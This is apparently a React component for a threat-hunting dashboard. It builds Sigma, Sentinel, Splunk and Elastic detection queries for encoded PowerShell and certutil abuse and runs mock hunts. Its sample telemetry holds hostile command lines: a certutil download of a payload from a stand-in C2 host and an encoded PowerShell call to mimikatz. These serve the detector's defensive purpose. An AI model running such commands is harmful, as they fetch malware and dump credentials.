"use client";

import React, { useState } from "react";
import {
  Search,
  Terminal,
  ShieldCheck,
  Zap,
  Copy,
  Check,
  AlertTriangle,
  Play,
  FileCode,
  Layers,
  Database,
} from "lucide-react";

export function ThreatHuntingStudio() {
  const [hypothesis, setHypothesis] = useState(
    "Adversaries executing certutil, mshta, or powershell with encoded commands to bypass endpoint inspection."
  );
  const [loading, setLoading] = useState(false);
  const [activeQueryTab, setActiveQueryTab] = useState<"sigma" | "sentinel" | "splunk" | "elastic">("sigma");
  const [copiedTab, setCopiedTab] = useState<string | null>(null);
  const [huntResults, setHuntResults] = useState<any>(null);
  const [errorMsg, setErrorMsg] = useState<string | null>(null);
  const [queries, setQueries] = useState<any>({
    sigma_yaml: `title: SageAI Autonomous Threat Hunt - Powershell
id: sigma-8f12a03c
status: experimental
description: Proactive hunt rule
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        Image|endswith:
            - '\\powershell.exe'
            - '\\pwsh.exe'
        CommandLine|contains:
            - '-enc'
            - 'downloadstring'
    condition: selection
level: high
tags:
    - attack.execution
    - attack.t1059.001`,
    sentinel_kql: `DeviceProcessEvents
| where TimeGenerated >= ago(7d)
| where FileName in~ ("powershell.exe", "pwsh.exe")
| where ProcessCommandLine has_any ("-enc", "bypass", "invoke")
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine
| sort by TimeGenerated desc`,
    splunk_spl: `index=security sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1
| eval process_name=lower(process_name)
| search (process_name="*powershell*" OR process_name="*certutil*") CommandLine="*-enc*"
| stats count earliest(_time) as first_seen latest(_time) as last_seen by host, user, process_name
| sort - count`,
    elastic_eql: `sequence by host.id with maxspan=5m
  [process where event.type == "start" and process.name in ("powershell.exe", "pwsh.exe")
   and process.command_line : "*-enc*"]
  [network where event.type == "start" and destination.ip != "127.0.0.1"]`,
  });

  const templates = [
    { title: "Living-off-the-Land (LotL)", text: "Adversaries executing certutil, mshta, or powershell with encoded commands to bypass endpoint inspection." },
    { title: "C2 Low-Jitter Beaconing", text: "Compromised internal hosts establishing repetitive outbound connections with jitter < 20% to external IPs." },
    { title: "Container Escape Probes", text: "Containerized workload invoking setns, mounting docker.sock, or executing ptrace on host processes." },
    { title: "OS Credential Dumping", text: "Unauthorized memory reading targeting lsass.exe or SAM registry hive access." },
  ];

  const forgeQueries = async () => {
    setLoading(true);
    setErrorMsg(null);
    try {
      const res = await fetch("/api/threat-hunting/forge-query", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ hypothesis }),
      });
      if (res.ok) {
        const data = await res.json();
        setQueries(data.queries);
      } else {
        setErrorMsg(`Failed to forge SIEM queries (HTTP ${res.status}).`);
      }
    } catch {
      setErrorMsg("Failed to reach threat hunting query forge.");
    } finally {
      setLoading(false);
    }
  };

  const runHunt = async () => {
    setLoading(true);
    setErrorMsg(null);
    try {
      const mockEvents = [
        { id: "EVT-01", process: "powershell.exe", command_line: "powershell.exe -nop -enc aW52b2tlLW1pbWlrYXR6", user: "SYSTEM", host: "fin-db-01" },
        { id: "EVT-02", process: "certutil.exe", command_line: "certutil -urlcache -split -f http://c2.bad/stage2.exe", user: "dev_admin", host: "app-node-03" },
        { id: "EVT-03", process: "nginx", command_line: "nginx -g 'daemon off;'", user: "www-data", host: "web-fe-01" },
        { id: "EVT-04", process: "postgres", command_line: "postgres -D /data", user: "postgres", host: "db-master" },
      ];
      const res = await fetch("/api/threat-hunting/hunt", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ hypothesis, telemetry_events: mockEvents }),
      });
      if (res.ok) {
        const data = await res.json();
        setHuntResults(data.hunt_results);
      } else {
        setErrorMsg(`Retrospective threat hunt failed (HTTP ${res.status}).`);
      }
    } catch {
      setErrorMsg("Retrospective threat hunt request failed.");
    } finally {
      setLoading(false);
    }
  };

  const copyToClipboard = async (text: string, tab: string) => {
    if (!text) return;
    setErrorMsg(null);
    if (!navigator?.clipboard?.writeText) {
      setErrorMsg("Clipboard write unavailable in this browser context.");
      return;
    }
    try {
      await navigator.clipboard.writeText(text);
      setCopiedTab(tab);
      setTimeout(() => setCopiedTab(null), 2000);
    } catch {
      setErrorMsg("Clipboard write blocked by browser.");
    }
  };

  return (
    <div className="space-y-6">
      {/* Top Banner */}
      <div className="bg-gradient-to-r from-amber-950/40 via-zinc-950 to-zinc-900 border border-amber-900/40 rounded-xl p-6">
        <div className="flex flex-col md:flex-row md:items-center justify-between gap-4">
          <div className="flex items-center gap-3">
            <div className="p-3 bg-amber-500/10 border border-amber-500/30 rounded-lg text-amber-400">
              <Search className="w-6 h-6" />
            </div>
            <div>
              <h2 className="text-xl font-bold text-white tracking-tight flex items-center gap-2">
                AI-Powered Threat Hunting & Multi-SIEM Query Forge
                <span className="text-xs font-mono px-2 py-0.5 bg-amber-950 border border-amber-700/60 rounded text-amber-300">
                  Hypothesis-Driven
                </span>
              </h2>
              <p className="text-xs text-zinc-400 mt-1">
                Natural-language hunting hypotheses auto-synthesized into Sigma, Sentinel KQL, Splunk SPL, and Elastic EQL.
              </p>
            </div>
          </div>

          <div className="flex items-center gap-3">
            <button
              type="button"
              onClick={forgeQueries}
              disabled={loading || !hypothesis}
              className="px-3.5 py-2 bg-zinc-800 hover:bg-zinc-700 text-white text-xs font-bold rounded-lg transition-all flex items-center gap-2"
            >
              <Zap className="w-3.5 h-3.5 text-amber-400" />
              Forge SIEM Queries
            </button>
            <button
              type="button"
              onClick={runHunt}
              disabled={loading || !hypothesis}
              className="px-4 py-2 bg-gradient-to-r from-amber-600 to-orange-600 hover:from-amber-500 hover:to-orange-500 text-white text-xs font-bold rounded-lg transition-all flex items-center gap-2 shadow-lg shadow-amber-950/40"
            >
              <Play className="w-3.5 h-3.5" />
              Execute Retrospective Hunt
            </button>
          </div>
        </div>

        {/* Template Quick Picks */}
        <div className="grid grid-cols-1 md:grid-cols-4 gap-2 mt-6">
          {templates.map((tpl, idx) => (
            <button
              type="button"
              key={idx}
              onClick={() => setHypothesis(tpl.text)}
              className="p-2.5 bg-black/40 hover:bg-black/70 border border-zinc-800 rounded-lg text-left transition-all"
            >
              <div className="text-[11px] font-bold text-amber-300">{tpl.title}</div>
              <div className="text-[10px] text-zinc-500 truncate mt-0.5">{tpl.text}</div>
            </button>
          ))}
        </div>
      </div>

      {errorMsg && (
        <div
          role="alert"
          className="px-4 py-3 rounded-xl bg-red-950/40 border border-red-700/50 text-xs font-mono text-red-300 flex items-center gap-2"
        >
          <AlertTriangle className="w-4 h-4 text-red-400 shrink-0" />
          <span>{errorMsg}</span>
        </div>
      )}

      {/* Hypothesis Input */}
      <div className="bg-zinc-950 border border-zinc-800 rounded-xl p-5 space-y-3">
        <label className="text-xs font-bold text-zinc-300 flex items-center justify-between">
          <span>Active Threat Hunting Hypothesis (Natural Language):</span>
          <span className="text-[10px] font-mono text-zinc-500">Auto-extracted indicators guide telemetry search</span>
        </label>
        <textarea
          rows={2}
          value={hypothesis}
          onChange={(e) => setHypothesis(e.target.value)}
          className="w-full bg-black border border-zinc-800 rounded-lg p-3 text-xs font-mono text-white focus:outline-none focus:border-amber-500"
        />
      </div>

      {/* Query Forge Tabs */}
      <div className="bg-zinc-950 border border-zinc-800 rounded-xl p-6 space-y-4">
        <div className="flex items-center justify-between border-b border-zinc-900 pb-3">
          <div className="flex items-center gap-2">
            <button
              type="button"
              onClick={() => setActiveQueryTab("sigma")}
              className={`px-3 py-1.5 text-xs font-bold rounded-lg transition-all ${
                activeQueryTab === "sigma" ? "bg-amber-950 text-amber-300 border border-amber-700/60" : "text-zinc-500 hover:text-zinc-300"
              }`}
            >
              Sigma YAML Rule
            </button>
            <button
              type="button"
              onClick={() => setActiveQueryTab("sentinel")}
              className={`px-3 py-1.5 text-xs font-bold rounded-lg transition-all ${
                activeQueryTab === "sentinel" ? "bg-amber-950 text-amber-300 border border-amber-700/60" : "text-zinc-500 hover:text-zinc-300"
              }`}
            >
              Microsoft Sentinel (KQL)
            </button>
            <button
              type="button"
              onClick={() => setActiveQueryTab("splunk")}
              className={`px-3 py-1.5 text-xs font-bold rounded-lg transition-all ${
                activeQueryTab === "splunk" ? "bg-amber-950 text-amber-300 border border-amber-700/60" : "text-zinc-500 hover:text-zinc-300"
              }`}
            >
              Splunk (SPL)
            </button>
            <button
              type="button"
              onClick={() => setActiveQueryTab("elastic")}
              className={`px-3 py-1.5 text-xs font-bold rounded-lg transition-all ${
                activeQueryTab === "elastic" ? "bg-amber-950 text-amber-300 border border-amber-700/60" : "text-zinc-500 hover:text-zinc-300"
              }`}
            >
              Elastic (EQL)
            </button>
          </div>

          <button
            type="button"
            onClick={() => {
              const currentContent =
                activeQueryTab === "sigma"
                  ? queries.sigma_yaml
                  : activeQueryTab === "sentinel"
                  ? queries.sentinel_kql
                  : activeQueryTab === "splunk"
                  ? queries.splunk_spl
                  : queries.elastic_eql;
              copyToClipboard(currentContent, activeQueryTab);
            }}
            className="px-2.5 py-1 bg-zinc-900 hover:bg-zinc-800 text-zinc-300 text-[11px] font-mono rounded border border-zinc-800 flex items-center gap-1.5"
          >
            {copiedTab === activeQueryTab ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
            {copiedTab === activeQueryTab ? "Copied" : "Copy Query"}
          </button>
        </div>

        <pre className="p-4 bg-black border border-zinc-900 rounded-lg text-xs font-mono text-zinc-300 overflow-x-auto whitespace-pre-wrap leading-relaxed">
          {activeQueryTab === "sigma" && queries.sigma_yaml}
          {activeQueryTab === "sentinel" && queries.sentinel_kql}
          {activeQueryTab === "splunk" && queries.splunk_spl}
          {activeQueryTab === "elastic" && queries.elastic_eql}
        </pre>
      </div>

      {/* Retrospective Hunt Results */}
      {huntResults && (
        <div className="bg-zinc-950 border border-zinc-800 rounded-xl p-6 space-y-4 font-mono text-xs">
          <div className="flex items-center justify-between border-b border-zinc-900 pb-3">
            <div>
              <h3 className="text-sm font-bold text-white flex items-center gap-2">
                <Database className="w-4 h-4 text-amber-400" />
                Retrospective Telemetry Hunt Verdict: {huntResults.hunt_verdict}
              </h3>
              <span className="text-[11px] text-zinc-500">
                Scanned {huntResults.telemetry_events_scanned} events across eBPF syscalls and endpoint logs
              </span>
            </div>
            <span
              className={`px-2.5 py-1 rounded border text-[10px] font-bold ${
                huntResults.confirmed_threat_count > 0
                  ? "bg-rose-950 text-rose-300 border-rose-800"
                  : "bg-emerald-950 text-emerald-300 border-emerald-800"
              }`}
            >
              {huntResults.confirmed_threat_count} Confirmed Threat Hits
            </span>
          </div>

          <div className="space-y-3">
            {huntResults.confirmed_hits.map((hit: any, idx: number) => (
              <div key={idx} className="p-3 bg-rose-950/20 border border-rose-900/60 rounded-lg space-y-2">
                <div className="flex items-center justify-between text-rose-400 font-bold">
                  <span>Target Hit: {hit.event_id}</span>
                  <span className="text-[10px] px-2 py-0.5 bg-rose-950 border border-rose-800 rounded">
                    Confidence: {(hit.confidence * 100).toFixed(0)}%
                  </span>
                </div>
                <div className="text-zinc-300 text-[11px] break-all">
                  Process: <span className="text-white font-bold">{hit.event_data.process}</span> | Command: <span className="text-zinc-200">{hit.event_data.command_line}</span>
                </div>
                <div className="flex items-center gap-2 text-[10px] text-zinc-500">
                  <span>Matched:</span>
                  {hit.matched_indicators.map((m: string, mIdx: number) => (
                    <span key={mIdx} className="px-1.5 py-0.5 bg-zinc-900 rounded text-amber-300">
                      {m}
                    </span>
                  ))}
                </div>
              </div>
            ))}
          </div>

          {huntResults.merkle_seal && (
            <div className="p-3 bg-black border border-emerald-900/40 rounded-xl flex items-center justify-between text-xs font-mono text-zinc-400">
              <div className="flex items-center gap-2 text-emerald-400 font-bold">
                <ShieldCheck className="w-4 h-4" />
                <span>Merkle Seal Block #{huntResults.merkle_seal.ledger_index} Cryptographically Verified</span>
              </div>
              <div className="text-zinc-500 text-[10px] truncate max-w-xs">{huntResults.merkle_seal.record_hash}</div>
            </div>
          )}
        </div>
      )}
    </div>
  );
}

